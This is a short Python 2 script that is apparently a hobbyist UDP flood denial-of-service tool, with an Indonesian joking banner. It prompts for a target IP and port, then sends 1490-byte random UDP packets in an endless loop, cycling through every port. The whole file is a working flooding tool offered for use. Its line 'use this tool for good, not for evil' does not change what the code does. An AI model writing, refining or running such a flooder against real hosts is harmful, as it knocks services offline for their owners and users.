

import sys
import os 
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet denial of services")
print
print " heker mau ngehek siapa bang"
print "   wow you read it: "
print "Thanks  to : All people "
print  "use this tool for good, not for evil"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet starting.....")
print "0% "
time.sleep(5)
print "25%"
time.sleep(5)
print "50%"
time.sleep(5)
print "nugguin yaaa wkwkwkwkkw"
time.sleep(5)
print "100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "send %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1


